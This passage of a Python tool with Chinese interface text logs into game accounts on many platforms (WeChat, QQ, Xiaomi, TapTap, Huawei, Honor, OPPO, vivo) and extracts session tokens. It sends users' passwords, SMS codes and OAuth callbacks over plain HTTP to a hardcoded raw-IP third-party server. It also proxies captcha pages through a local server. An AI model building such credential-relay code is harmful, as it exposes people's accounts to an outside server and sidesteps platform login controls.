                    cfg = accounts[idx]["cfg"]
                else:
                    print(f"{C.RED}序号无效{C.R}")
                    continue
            except ValueError:
                print(f"{C.RED}请输入数字{C.R}")
                continue
        elif choice == "5" and accounts:
            print(f"\n{C.C}已保存账号列表：{C.R}")
            for i, acc in enumerate(accounts, 1):
                nick_str = f" 昵称:{acc.get('nickname','')}" if acc.get('nickname') else ""

                disp_name = _make_account_name(acc.get('cfg', {}), acc.get('ui', ''), acc.get('platform', ''))
                print(f" {i}. {disp_name}（ui={acc['ui']} {acc['platform']}{nick_str}）")
            sel = input("请输入要删除的序号（多个用空格分隔，回车删除）: ").strip()
            if sel:
                idxs = []
                for s in sel.split():
                    try:
                        idxs.append(int(s) - 1)
                    except ValueError:
                        print(f"{C.RED}序号无效: {s}{C.R}")
                if idxs:
                    idxs = sorted(set(idxs), reverse=True)
                    ok = 0
                    for idx in idxs:
                        if delete_account(idx):
                            ok += 1
                    print(f"{C.G}已删除{ok}个账号{C.R}")
            continue
        else:
            print(f"{C.RED}无效选择{C.R}")
            continue

        if cfg is None:
            continue

        _RUNTIME_CONFIG = cfg

        try:
            nc = get_login_config(cfg)
            if nc is None:
                print(f"{C.RED}配置无效，无法登录{C.R}")
                print(f"{C.Y}输入错误，请检查响应重试{C.R}")
                continue
            session.encrypt_url = _fastest_encrypt_url()
            if session.login(nc):
                print(f"{C.G}登录成功{C.R}")
                add_account(cfg, session.ui, session.platform)
            else:
                print(f"{C.RED}登录失败{C.R}")
                print(f"{C.Y}输入错误，请检查响应重试{C.R}")
        except Exception as e:
            print(f"{C.RED}登录出错: {e}{C.R}")
            print(f"{C.Y}输入错误，请检查响应重试{C.R}")
            import traceback
            traceback.print_exc()
            continue

def _login_by_account():
    print(f"\n{C.C}===== 账密登录 ====={C.R}")
    print(" 1. 官服（回车默认）")
    print(" 2. tap官方")
    print(" 3. 好游快爆")
    print(" 4. 努比亚红魔")
    print(" 5. 4399")
    c = input("选择渠道（回车官服）: ").strip()
    if c == "":
        c = "1"
    if c == "5":
        return _login_4399_by_account()
    cid_map = {"1": 208, "2": 250, "3": 261, "4": 215}
    cid = cid_map.get(c, 208)
    version_map = {"1": "dj2.0-4.0.0", "2": "dj4.0-4.10.0", "3": "dj2.0-4.0.0", "4": "dj2.0-4.0.0"}
    version = version_map.get(c, "dj2.0-4.0.0")
    uid = input("账号：").strip().replace(" ", "")
    if not uid:
        return None
    pwd = input("密码：").strip().replace(" ", "")
    cfg = {"channel_id": cid, "channelSdkVersion": version,
           "pt": {"userid": uid, "password": pwd}}
    return cfg

def input_multiline_json(prompt="粘贴: "):
    print(prompt)
    lines = []
    while True:
        try:
            line = input()
        except EOFError:
            break
        lines.append(line)
        try:
            return json.loads("\n".join(lines))
        except Exception:
            continue
    return None

def _login_by_capture():
    """抓包talkyun明文响应：4399/b站/九游/iOS"""
    print(f"\n{C.C}===== 抓包明文响应登录 ====={C.R}")
    print(" 1. 4399")
    print(" 2. b站")
    print(" 3. 九游")
    print(" 4. iOS（key+message格式）")
    print(" （回车返回）")
    c = input("请选择渠道: ").strip()
    if not c:
        return None
    if c == "4":
        print(f"\n{C.C}请粘贴 key+message 格式的登录态（支持多行，粘贴完按回车）：{C.R}")
        print('格式示例：{"key": "10108", "message": "时间|ui|iOS|ek|pi|..."}')
        cfg = input_multiline_json()
        if cfg is None:
            print(f"{C.RED}解析失败，请检查JSON格式{C.R}")
            return None
        if "key" in cfg and "message" in cfg and "iOS" in str(cfg.get("message", "")):
            print(f"{C.G}登录态格式正确{C.R}")
            return cfg
        else:
            print(f"{C.RED}格式不正确，需要包含 key 和 message 字段，且 message 包含 iOS{C.R}")
            return None
    else:
        code_map = {"1": "0000", "2": "b站", "3": "九游"}
        code = code_map.get(c, "0000")
        print(f"\n{C.C}请粘贴抓包得到的 content 字段或完整登录配置（支持多行）：{C.R}")
        data = input_multiline_json()
        if data is None:
            print(f"{C.RED}JSON解析失败，请检查格式{C.R}")
            return None
        if "code" in data and "content" in data:
            cfg = data
            print(f"{C.G}检测到完整登录配置，直接使用{C.R}")
        else:
            token = json.dumps(data, ensure_ascii=False)
            cfg = {"code": code, "content": token}
            print(f"{C.G}已包装为登录配置{C.R}")
        return cfg

class Color:
    """终端颜色"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    RESET = '\033[0m'

THIRD_PARTY_LOGIN_URL = "http://118.145.113.5:8000"

class BaseLogin:
    """登录基类"""

    def __init__(self, server_url=THIRD_PARTY_LOGIN_URL):
        self.server_url = server_url.rstrip('/')
        self.session = requests.Session()
        self.result = None
        self.state = None

    def _get(self, path, **kwargs):
        """GET请求"""
        return self.session.get(f"{self.server_url}{path}", timeout=30, **kwargs)

    def _post(self, path, data=None, **kwargs):
        """POST请求"""
        return self.session.post(f"{self.server_url}{path}", data=data, timeout=30, **kwargs)

    def _print_result(self, title, fields, data):
        """打印结果"""
        print(f"\n{'='*50}")
        print(f"🎮 {title}")
        print('='*50)
        for key, label in fields:
            value = data.get(key, '')
            print(f"  {label:<15}: {value}")
        print('='*50)

    def save_to_file(self, filename):
        """保存到文件"""
        if self.result:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(self.result, f, ensure_ascii=False, indent=2)
            print(f"{Color.GREEN}💾 已保存到 {filename}{Color.RESET}")
        else:
            print(f"{Color.YELLOW}⚠️ 暂无数据可保存{Color.RESET}")

    def copy_to_clipboard(self):
        """复制到剪贴板"""
        if self.result:
            text = json.dumps(self.result, ensure_ascii=False)
            try:
                import subprocess
                subprocess.run(['clip'], input=text.encode('utf-16'), check=True)
                print(f"{Color.GREEN}📋 已复制到剪贴板{Color.RESET}")
            except:
                print(f"{Color.YELLOW}⚠️ 复制失败，请手动复制:{Color.RESET}")
                print(text)
        else:
            print(f"{Color.YELLOW}⚠️ 暂无数据可复制{Color.RESET}")

class WeChatLogin(BaseLogin):
    """微信扫码登录 - 完全Python实现"""

    def get_qr_url(self):
        """获取二维码图片URL"""
        return f"{self.server_url}/wx/qr?t={int(time.time()*1000)}"

    def refresh_qr(self):
        """刷新二维码"""
        try:
            self._post('/wx/refresh')
            return True
        except:
            return False

    def login(self, timeout=300, open_browser=True):
        """
        微信扫码登录
        :param timeout: 超时时间(秒)
        :param open_browser: 是否自动打开浏览器显示二维码
        :return: 登录结果
        """
        print(f"\n{Color.CYAN}===== 微信扫码登录 ====={Color.RESET}")

        try:
            self._get('/wx')
            print(f"{Color.GREEN}✅ 二维码已生成{Color.RESET}")
        except Exception as e:
            print(f"{Color.YELLOW}⚠️ 生成二维码警告: {e}{Color.RESET}")

        qr_url = self.get_qr_url()
        print(f"📱 二维码地址: {qr_url}")

        if open_browser:
            try:

                import tempfile
                import os
                qr_resp = self.session.get(qr_url, timeout=15)
                if qr_resp.status_code == 200 and len(qr_resp.content) > 1000:
                    tmp_dir = tempfile.gettempdir()
                    qr_path = os.path.join(tmp_dir, "wx_qr.png")
                    with open(qr_path, "wb") as f:
                        f.write(qr_resp.content)

                    html_parts = []
                    html_parts.append("<!DOCTYPE html><html><head><meta charset='utf-8'><title>微信扫码登录</title>")
                    html_parts.append("<style>body{font-family:Microsoft YaHei,Arial,sans-serif;background:#f5f5f5;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;margin:0}.container{background:white;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);text-align:center}h1{color:#07c160;margin-bottom:20px;font-size:24px}.qr-box{width:280px;height:280px;border:2px solid #07c160;border-radius:8px;padding:10px;background:white;margin:20px auto}.qr-box img{width:100%;height:100%;object-fit:contain}.tip{color:#666;font-size:16px;margin-top:20px}</style>")
                    html_parts.append("</head><body><div class='container'><h1>微信扫码登录</h1>")
                    html_parts.append(f"<div class='qr-box'><img src='file:///{qr_path.replace(chr(92), '/')}' alt='微信二维码'></div>")
                    html_parts.append("<div class='tip'>请用手机微信扫描二维码并确认登录<br><span style='font-size:12px;color:#999'>扫码成功后可手动关闭此页面</span></div>")
                    html_parts.append("</div></body></html>")
                    html_content = "".join(html_parts)

                    html_path = os.path.join(tmp_dir, "wx_qr_login.html")
                    with open(html_path, "w", encoding="utf-8") as f:
                        f.write(html_content)

                    webbrowser.open("file:///" + html_path.replace(chr(92), "/"))
                    print(f"{Color.GREEN}✅ 已在浏览器中打开二维码{Color.RESET}")
                else:

                    print(f"{Color.YELLOW}⚠️ 二维码下载失败，直接打开URL{Color.RESET}")
                    webbrowser.open(qr_url)
            except Exception as e:
                print(f"{Color.YELLOW}⚠️ 打开浏览器失败: {e}{Color.RESET}")
                print(f"{Color.YELLOW}⚠️ 请手动复制上方地址到浏览器打开{Color.RESET}")

        print(f"\n⏳ 等待微信扫码...")
        print("请用手机微信扫码并确认")

        start = time.time()
        while time.time() - start < timeout:
            try:
                resp = self._get('/wx/status')
                data = resp.json()

                if data.get('token'):
                    print(f"\n{Color.GREEN}✅ 微信登录成功! 浏览器可以关闭了{Color.RESET}")
                    self.result = data['token']
                    self._print_result("微信登录信息", [
                        ('openid', 'openid'),
                        ('atk', 'atk'),
                        ('atk_expire', 'atk_expire'),
                        ('rtk', 'rtk'),
                        ('pf', 'pf'),
                        ('pfKey', 'pfKey'),
                        ('regChannel', 'regChannel'),
                    ], self.result)
                    return self.result

                if data.get('expired'):
                    print(f"\n🔄 二维码已过期，正在刷新...")
                    self.refresh_qr()
                    qr_url = self.get_qr_url()
                    print(f"📱 新二维码地址: {qr_url}")
                elif data.get('status') == 'waiting':
                    remain = max(0, int(data.get('expires_at', 0) - time.time()))
                    print(f"\r⏳ 等待扫码 ({remain}s 后自动刷新)...", end='', flush=True)
                elif data.get('status') == 'confirmed':
                    print(f"\r📱 已扫码，请在手机上确认...", end='', flush=True)

                time.sleep(1.2)
            except Exception as e:
                time.sleep(1)

        print(f"\n{Color.RED}❌ 登录超时{Color.RESET}")
        return None

class QQLogin(BaseLogin):
    """QQ登录 - Python实现获取授权链接，登录需浏览器"""

    def get_auth_url(self):
        """获取登录链接"""
        try:
            resp = self._get('/qq/auth_url')
            return resp.json().get('url')
        except Exception as e:
            print(f"{Color.RED}❌ 获取登录链接失败: {e}{Color.RESET}")
            return None

    def login_with_url(self, callback_url):
        """
        使用登录后跳转的URL登录
        :param callback_url: 登录后跳转的完整URL
        :return: 登录结果
        """
        try:
            print(f"{Color.CYAN}⏳ 正在获取QQ游戏token...{Color.RESET}")
            resp = self._post('/qq/login', data={'url': callback_url})
            data = resp.json()

            if data.get('error'):
                print(f"{Color.RED}❌ 登录失败: {data['error']}{Color.RESET}")
                return None

            self.result = data
            self._print_result("QQ登录信息", [
                ('oi', 'oi'),
                ('access_token', 'access_token'),
                ('openid', 'openid'),
                ('pay_token', 'pay_token'),
                ('t', 't'),
            ], data)
            return data
        except Exception as e:
            print(f"{Color.RED}❌ 网络错误: {e}{Color.RESET}")
            return None

    def login(self, open_browser=True):
        """
        QQ登录（需要在浏览器中完成授权）
        :param open_browser: 是否自动打开浏览器
        :return: 登录结果
        """
        print(f"\n{Color.CYAN}===== QQ登录 ====={Color.RESET}")
        print(f"{Color.YELLOW}⚠️ QQ登录需要在浏览器中完成授权{Color.RESET}")

        auth_url = self.get_auth_url()
        if not auth_url:
            return None

        print(f"🔑 登录链接: {auth_url}")

        if open_browser:
            try:
                webbrowser.open(auth_url)
                print(f"{Color.GREEN}✅ 已在浏览器中打开QQ登录页面{Color.RESET}")
            except:
                print(f"{Color.YELLOW}⚠️ 请手动复制上方链接到浏览器打开{Color.RESET}")

        print(f"\n💡 在浏览器中完成QQ登录后，浏览器会跳转到一个页面")
        print("请复制浏览器地址栏的完整URL")
        callback_url = input("请粘贴登录后跳转的URL: ").strip()

        if callback_url:
            return self.login_with_url(callback_url)
        return None

class XiaomiLogin(BaseLogin):
    """小米登录 - Python实现获取授权链接，授权需浏览器"""

    def get_auth_url(self):
        """获取授权链接"""
        try:
            resp = self._get('/xiaomi/auth_url')
            return resp.json().get('url')
        except Exception as e:
            print(f"{Color.RED}❌ 获取授权链接失败: {e}{Color.RESET}")
            return None

    def _extract_code(self, text):
        """从URL中提取code"""
        text = text.strip()
        match = re.search(r'[?&#]code=([^&]+)', text)
        if match:
            return urllib.parse.unquote(match.group(1))
        return text if 'http' not in text else None

    def login_with_code(self, code_or_url):
        """使用授权code或回调URL登录"""
        code = self._extract_code(code_or_url)
        if not code:
            print(f"{Color.RED}❌ 无法提取code{Color.RESET}")
            return None

        try:
            print(f"{Color.CYAN}⏳ 正在获取游戏账号...{Color.RESET}")
            resp = self._post('/xiaomi/login', data={'code': code})
            data = resp.json()

            if data.get('error'):
                print(f"{Color.RED}❌ 登录失败: {data['error']}{Color.RESET}")
                return None

            if data.get('ok'):
                print(f"{Color.GREEN}✅ 登录成功!{Color.RESET}")
                self.result = data
                game = data.get('game', {})
                self._print_result("小米登录信息", [
                    ('appAccountId', 'appAccountId'),
                    ('openId', 'openId'),
                    ('nickName', 'nickName'),
                    ('session', 'session'),
                    ('serviceToken', 'serviceToken'),
                ], game)
                return data
            else:
                print(f"{Color.YELLOW}⚠️ 未成功，请检查code{Color.RESET}")
                return None
        except Exception as e:
            print(f"{Color.RED}❌ 网络错误: {e}{Color.RESET}")
            return None

    def login(self, open_browser=True):
        """
        小米登录（需要在浏览器中完成授权）
        :param open_browser: 是否自动打开浏览器
        :return: 登录结果
        """
        print(f"\n{Color.CYAN}===== 小米登录 ====={Color.RESET}")
        print(f"{Color.YELLOW}⚠️ 小米登录需要在浏览器中完成授权{Color.RESET}")

        auth_url = self.get_auth_url()
        if not auth_url:
            return None

        print(f"🔑 授权链接: {auth_url}")

        if open_browser:
            try:
                webbrowser.open(auth_url)
                print(f"{Color.GREEN}✅ 已在浏览器中打开小米授权页面{Color.RESET}")
            except:
                print(f"{Color.YELLOW}⚠️ 请手动复制上方链接到浏览器打开{Color.RESET}")

        print(f"\n💡 授权完成后，浏览器会跳转到一个打不开的页面（正常）")
        print("请复制浏览器地址栏的完整URL")
        code_or_url = input("请粘贴授权URL或Code: ").strip()

        if code_or_url:
            return self.login_with_code(code_or_url)
        return None

class TapTapLogin(BaseLogin):
    """TapTap登录 - 完全Python实现（短信验证码）"""

    def send_sms(self, phone):
        """发送验证码 - 使用本地代理服务器处理滑块验证"""
        import http.server
        import threading
        import urllib.parse as _urlparse
        import socket

        try:
            print(f"{Color.CYAN}⏳ 正在发送验证码...{Color.RESET}")
            resp = self._post('/tap/sms/send', data={'phone': phone})
            data = resp.json()

            if data.get('need_captcha'):
                self.state = data.get('state')
                self._captcha_meta = data.get('captcha', {})
                self._captcha_done = False
                self._captcha_result = None

                print(f"{Color.YELLOW}⚠️ 需要安全验证{Color.RESET}")

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.bind(('127.0.0.1', 0))
                port = s.getsockname()[1]
                s.close()

                login_self = self
                base_prefix = f"http://127.0.0.1:{port}"

                class TapTapProxyHandler(http.server.BaseHTTPRequestHandler):
                    def log_message(self, format, *args):
                        pass

                    def do_GET(self):
                        parsed = _urlparse.urlparse(self.path)

                        if parsed.path == '/captcha_page':

                            captcha_url = f"{login_self.server_url}/tap/sms/captcha?state={_urlparse.quote(login_self.state)}&kind=send"

                            resp = login_self.session.get(captcha_url, timeout=30)
                            html = resp.text

                            meta_json = json.dumps(login_self._captcha_meta, ensure_ascii=False)
                            html = html.replace(
                                "try{meta=JSON.parse(p.get('meta')||'{}');}catch(e){meta={};}",
                                f"meta={meta_json};"
                            )

                            html = html.replace("'/tap/sms/send'", f"'{base_prefix}/tap_sms_send'")
                            html = html.replace('"/tap/sms/send"', f'"{base_prefix}/tap_sms_send"')
                            html = html.replace("'/tap/sms/login'", f"'{base_prefix}/tap_sms_login'")
                            html = html.replace('"/tap/sms/login"', f'"{base_prefix}/tap_sms_login"')

                            self.send_response(200)
                            self.send_header('Content-Type', 'text/html; charset=utf-8')
                            self.end_headers()
                            self.wfile.write(html.encode('utf-8'))
                        else:
                            self.send_response(404)
                            self.end_headers()

                    def do_POST(self):
                        parsed = _urlparse.urlparse(self.path)

                        if parsed.path in ('/tap_sms_send', '/tap_sms_login'):

                            content_length = int(self.headers.get('Content-Length', 0))
                            body = self.rfile.read(content_length)

                            headers = {
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'Referer': f'{login_self.server_url}/tap/sms/captcha',
                                'Origin': login_self.server_url,
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                                'Accept': 'application/json, text/javascript, */*; q=0.01',
                                'X-Requested-With': 'XMLHttpRequest',
                            }

                            target_path = '/tap/sms/send' if parsed.path == '/tap_sms_send' else '/tap/sms/login'

                            resp = login_self.session.post(
                                f"{login_self.server_url}{target_path}",
                                data=body,
                                headers=headers,
                                timeout=30
                            )

                            result = resp.json()
                            login_self._captcha_done = True
                            login_self._captcha_result = result

                            print(f"{Color.CYAN}[调试] {target_path}响应: {json.dumps(result, ensure_ascii=False)[:200]}{Color.RESET}")

                            self.send_response(200)
                            self.send_header('Content-Type', 'application/json')
                            self.end_headers()
                            self.wfile.write(resp.content)
                        else:
                            self.send_response(404)
                            self.end_headers()

                server = http.server.HTTPServer(('127.0.0.1', port), TapTapProxyHandler)
                server_thread = threading.Thread(target=server.serve_forever, daemon=True)
                server_thread.start()

                local_url = f"{base_prefix}/captcha_page"
                print(f"请在浏览器中完成验证: {local_url}")

                try:
                    webbrowser.open(local_url)
                except:
                    pass

                print(f"{Color.CYAN}⏳ 等待验证完成...{Color.RESET}")

                start_time = time.time()
                while time.time() - start_time < 180:
                    if self._captcha_done:
                        break
                    time.sleep(1)

                server.shutdown()

                if not self._captcha_done:
                    print(f"{Color.RED}❌ 验证超时{Color.RESET}")
                    return False

                time.sleep(2)

                if self._captcha_result and self._captcha_result.get('ok'):
                    print(f"{Color.GREEN}✅ 验证成功，验证码已发送{Color.RESET}")
                    return True
                else:
                    error_msg = self._captcha_result.get('error', '未知错误') if self._captcha_result else '未知错误'
                    print(f"{Color.RED}❌ 验证失败: {error_msg}{Color.RESET}")
                    return False

            if data.get('ok'):
                self.state = data.get('state')
                print(f"{Color.GREEN}✅ 验证码已发送，请注意查收短信{Color.RESET}")
                return True

            print(f"{Color.RED}❌ 发送失败: {data.get('error', '未知错误')}{Color.RESET}")
            return False
        except Exception as e:
            print(f"{Color.RED}❌ 网络错误: {e}{Color.RESET}")
            import traceback
            traceback.print_exc()
            return False

    def login_with_code(self, code):
        """使用验证码登录"""
        if not self.state:
            print(f"{Color.RED}❌ 请先发送验证码{Color.RESET}")
            return None

        try:
            print(f"{Color.CYAN}⏳ 正在登录...{Color.RESET}")
            resp = self._post('/tap/sms/login', data={
                'state': self.state,
                'code': code
            })
            data = resp.json()

            if data.get('need_captcha'):
                captcha_url = f"{self.server_url}/tap/sms/captcha?state={urllib.parse.quote(data['state'])}&kind=login&code={urllib.parse.quote(code)}"
                print(f"{Color.YELLOW}⚠️ 登录需要安全验证{Color.RESET}")
                print(f"请在浏览器中完成验证: {captcha_url}")
                try:
                    webbrowser.open(captcha_url)
                except:
                    pass
                input("完成验证后按回车键继续...")
                return 'captcha'

            if data.get('ok'):
                print(f"{Color.GREEN}✅ 登录成功!{Color.RESET}")
                time.sleep(2)
                self.result = data
                self._print_result("TapTap登录信息", [
                    ('oi', 'oi'),
                    ('t', 't'),
                ], data)
                return data

            print(f"{Color.RED}❌ 登录失败: {data.get('error', '未知错误')}{Color.RESET}")
            return None
        except Exception as e:
            print(f"{Color.RED}❌ 网络错误: {e}{Color.RESET}")
            return None

    def poll_status(self, timeout=60):
        """轮询验证码状态"""
        if not self.state:
            return None

        print(f"{Color.CYAN}⏳ 等待验证完成...{Color.RESET}")
        start = time.time()
        while time.time() - start < timeout:
            try:
                resp = self._get(f'/tap/sms/status?state={urllib.parse.quote(self.state)}')
                data = resp.json()

                if data.get('ok') and data.get('step') == 'code_sent':
                    print(f"{Color.GREEN}✅ 验证通过，验证码已发送{Color.RESET}")
                    return 'code_sent'
                if data.get('ok') and data.get('step') == 'logged_in':
                    print(f"{Color.GREEN}✅ 登录成功{Color.RESET}")
                    return 'logged_in'

                time.sleep(1.5)
            except:
                time.sleep(1)

        return None

    def login(self):
        """TapTap短信登录"""
        print(f"\n{Color.CYAN}===== TapTap登录 ====={Color.RESET}")

        phone = input("请输入TapTap账号手机号: ").strip()
        if not phone:
            return None

        result = self.send_sms(phone)
        if result == False:
            return None

        code = input("请输入短信验证码: ").strip()
        if not code:
            return None

        return self.login_with_code(code)

class HuaweiLogin(BaseLogin):
    """华为登录 - 完全Python实现（账密/短信）"""

    def login_with_password(self, account, password):
        """账密登录"""
        try:
            print(f"{Color.CYAN}⏳ 正在请求 HMS loginV3...{Color.RESET}")
            resp = self._post('/huawei/login', data={
                'mode': 'pwd',
                'account': account,
                'password': password
            })
            data = resp.json()

            if data.get('error'):
                print(f"{Color.RED}❌ 登录失败: {data['error']}{Color.RESET}")
                return None

            if data.get('need_sms'):
                print(f"{Color.YELLOW}📨 {data.get('message', '需要短信二次验证')}{Color.RESET}")
                return 'need_sms'

            print(f"{Color.GREEN}✅ 纯代码登录成功!{Color.RESET}")
            self.result = data
            self._print_result("华为登录信息", [
                ('oi', 'oi (V202: userId)'),
                ('hwt', 'hwt (V202: accessToken|openId|unionId)'),
            ], data)
            return data
        except Exception as e:
            print(f"{Color.RED}❌ 网络错误: {e}{Color.RESET}")
            return None

    def send_sms(self, phone):
        """发送短信验证码"""
        try:
            print(f"{Color.CYAN}⏳ 正在发送验证码...{Color.RESET}")
            resp = self._post('/huawei/send_sms', data={'phone': phone})
            data = resp.json()

            if data.get('error'):
                print(f"{Color.RED}❌ 发送失败: {data['error']}{Color.RESET}")
                return False

            print(f"{Color.GREEN}✅ {data.get('message', '验证码已发送')}{Color.RESET}")
            return True
        except Exception as e:
            print(f"{Color.RED}❌ 网络错误: {e}{Color.RESET}")
            return False

    def login(self):
        """华为登录"""
        print(f"\n{Color.CYAN}===== 华为登录 ====={Color.RESET}")
        print(" 1. 账号+密码")
        print(" 2. 手机号+短信验证码")
        mode = input("请选择登录方式 (1-2): ").strip()

        if mode == '1':
            account = input("请输入华为账号(手机号/邮箱/账号名): ").strip()
            password = input("请输入密码: ").strip()
            if account and password:
                result = self.login_with_password(account, password)
                if result == 'need_sms':
                    phone = input(f"请输入手机号({account}): ").strip() or account
                    self.send_sms(phone)

                return result
        elif mode == '2':
            phone = input("请输入手机号: ").strip()
            if phone:
                self.send_sms(phone)
                code = input("请输入短信验证码: ").strip()

        return None

class HonorLogin(BaseLogin):
    """荣耀登录 - 完全Python实现（账密）"""

    def login_with_password(self, phone, password):
        """账密登录"""
        try:
            print(f"{Color.CYAN}⏳ 账密登录中 (IDM/loginV3)...{Color.RESET}")
            resp = self._post('/honor_native/pwd_login', data={
                'phone': phone,
                'password': password
            })
            data = resp.json()

            if not data.get('ok'):
                print(f"{Color.RED}❌ 登录失败: {data.get('error', json.dumps(data)[:300])}{Color.RESET}")
                return None

            print(f"{Color.GREEN}✅ 登录成功，换票中...{Color.RESET}")
            time.sleep(1)

            resp2 = self._post('/honor_native/finish')
            data2 = resp2.json()

            if data2.get('oi') and data2.get('ryt'):
                print(f"{Color.GREEN}✅ 已获得 oi/ryt!{Color.RESET}")
                self.result = data2
                self._print_result("荣耀登录信息", [
                    ('oi', 'oi'),
                    ('ryt', 'ryt'),
                ], data2)
                return data2

            print(f"{Color.RED}❌ 换票失败: {data2.get('error', json.dumps(data2)[:200])}{Color.RESET}")
            return None
        except Exception as e:
            print(f"{Color.RED}❌ 网络错误: {e}{Color.RESET}")
            return None

    def reset(self):
        """重置会话"""
        try:
            self._post('/honor_native/reset')
            print(f"{Color.GREEN}✅ 会话已重置{Color.RESET}")
            return True
        except:
            return False

    def login(self):
        """荣耀登录"""
        print(f"\n{Color.CYAN}===== 荣耀登录 ====={Color.RESET}")

        phone = input("请输入手机号: ").strip()
        password = input("请输入密码: ").strip()

        if phone and password:
            return self.login_with_password(phone, password)
        return None

class OPPOLogin(BaseLogin):
    """OPPO登录 - 完全Python实现（账密/短信/滑块）"""

    def login_with_password(self, account, password):
        """账密登录"""
        try:
            print(f"{Color.CYAN}⏳ 登录中...{Color.RESET}")
            resp = self._post('/oppo/login', data={
                'account': account,
                'password': password,
                'prefer_verify': 'SMS',
                'password_order': 'md5,origin,sha256',
                'try_validate_code_auth': '1',
                'captcha_code': ''
            })
            data = resp.json()
            return self._handle_state(data)
        except Exception as e:
            print(f"{Color.RED}❌ 网络错误: {e}{Color.RESET}")
            return None

    def _handle_state(self, data):
        """处理登录状态"""
        if data.get('error'):
            state = data.get('state')
            if state == 'need_captcha':
                return self._handle_captcha(data)
            else:
                print(f"{Color.RED}❌ {data['error']}{Color.RESET}")
                return None

        state = data.get('state')

        if state == 'need_captcha':
            return self._handle_captcha(data)
        elif state == 'done':
            print(f"{Color.GREEN}✅ 登录完成!{Color.RESET}")
            materials = data.get('materials', {})
            return self._get_gamesdk(materials)
        elif state == 'ready_send_sms':
            print(f"{Color.CYAN}📨 准备发送短信验证码...{Color.RESET}")
            return self._send_sms()
        elif state == 'waiting_code':
            print(f"{Color.CYAN}📨 验证码已发送({data.get('verify_method', '')})，请查收短信{Color.RESET}")
            return self._input_code()
        elif state == 'error':
            print(f"{Color.RED}❌ {data.get('error', '未知错误')}{Color.RESET}")
            return None

        return None

    def _handle_captcha(self, data):
        """处理滑块验证码"""
        print(f"{Color.YELLOW}⚠️ 需要图形/滑块验证码{Color.RESET}")
        captcha_info = data.get('captcha', {})

        captcha_url = None
        for key, value in captcha_info.items():
            if isinstance(value, str) and re.match(r'^https?://', value):
                if re.search(r'captcha|verify|slider|risk|geetest', value, re.I):
                    captcha_url = value
                    break

        if captcha_url:
            print(f"请在浏览器中完成验证: {captcha_url}")
            try:
                webbrowser.open(captcha_url)
            except:
                pass
        else:
            print(f"验证码信息: {json.dumps(captcha_info, ensure_ascii=False)[:500]}")

        captcha_code = input("请输入验证码/captchaCode (完成验证后): ").strip()
        if captcha_code:
            try:
                resp = self._post('/oppo/captcha', data={'captcha_code': captcha_code})
                return self._handle_state(resp.json())
            except Exception as e:
                print(f"{Color.RED}❌ 验证失败: {e}{Color.RESET}")
                return None

        return None

    def _send_sms(self):
        """发送短信验证码"""
        try:
            resp = self._post('/oppo/send')
            return self._handle_state(resp.json())
        except Exception as e:
            print(f"{Color.RED}❌ 发送失败: {e}{Color.RESET}")
            return None

    def _input_code(self):
        """输入短信验证码"""
        code = input("请输入短信验证码: ").strip()
        if code:
            try:
                resp = self._post('/oppo/code', data={'code': code})
                return self._handle_state(resp.json())
            except Exception as e:
                print(f"{Color.RED}❌ 验证失败: {e}{Color.RESET}")
                return None
        return None

    def _get_gamesdk(self, materials):
        """获取游戏token"""
        try:
            if not materials or not materials.get('tokens') or not materials['tokens']:
                print(f"{Color.RED}❌ 未获取到token{Color.RESET}")
                return None

            token = materials['tokens'][0]
            access_token = materials.get('accessToken', '')

            print(f"{Color.CYAN}🚀 正在换取游戏token...{Color.RESET}")
            resp = self._post('/oppo/gamesdk', data={'token': token})
            data = resp.json()

            if data.get('error'):
                print(f"{Color.RED}❌ {data['error']}{Color.RESET}")
                return None

            data['accessToken'] = access_token
            self.result = data

            if data.get('ok'):
                print(f"{Color.GREEN}✅ 成功获取游戏token!{Color.RESET}")
            else:
                print(f"{Color.YELLOW}⚠️ 未取到完整 roleid/ticket{Color.RESET}")

            self._print_result("OPPO游戏token", [
                ('accessToken', 'accessToken'),
                ('ssoid', 'ssoid'),
                ('roleid', 'roleid'),
                ('role_name', 'role_name'),
                ('ticket', 'ticket'),
            ], data)
            return data
        except Exception as e:
            print(f"{Color.RED}❌ 换票失败: {e}{Color.RESET}")
            return None

    def login(self):
        """OPPO登录"""
        print(f"\n{Color.CYAN}===== OPPO登录 ====={Color.RESET}")

        account = input("请输入账号（手机号）: ").strip()
        password = input("请输入密码: ").strip()

        if account and password:
            return self.login_with_password(account, password)
        return None

class VivoLogin(BaseLogin):
    """vivo登录 - 完全Python实现（账密/短信/滑块）"""

    def password_login(self, account, password):
        """账密登录"""
        try:
            print(f"{Color.CYAN}⏳ 账密登录中...{Color.RESET}")
            resp = self._post('/vivo_native/password_login', data={
                'account': account,
                'password': password
            })
            data = resp.json()
            return self._handle_state(data)
        except Exception as e:
            print(f"{Color.RED}❌ 网络错误: {e}{Color.RESET}")
            return None

    def _handle_state(self, data):
        """处理登录状态"""
        if data.get('need_captcha'):
            return self._handle_captcha(data, 'pwd')

        if data.get('need_phone_verify'):
            print(f"{Color.CYAN}📱 账密已通过，账号需验证手机号({data.get('phone', '')}){Color.RESET}")
            return self._phone_verify()

        if data.get('ok'):
            print(f"{Color.GREEN}✅ 账密登录成功，加载账号列表...{Color.RESET}")
            return self._load_list()

        if data.get('error'):
            print(f"{Color.RED}❌ {data.get('error', '未知错误')}{Color.RESET}")
            return None

        return None

    def _handle_captcha(self, data, kind):
        """处理滑块验证码 - 完整代理方案"""
        import http.server
        import threading
        import urllib.parse as _urlparse

        self.state = data.get('state', '')
        self._captcha_kind = kind
        self._captcha_meta = data.get('captcha', {})
        self._captcha_done = False
        self._captcha_result = None

        print(f"{Color.YELLOW}⚠️ 检测到滑块验证{Color.RESET}")

        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('127.0.0.1', 0))
        port = s.getsockname()[1]
        s.close()

        login_self = self
        base_prefix = f"http://127.0.0.1:{port}"

        class ProxyHandler(http.server.BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                pass

            def _proxy(self, target_url):
                """代理请求到目标URL"""
                try:
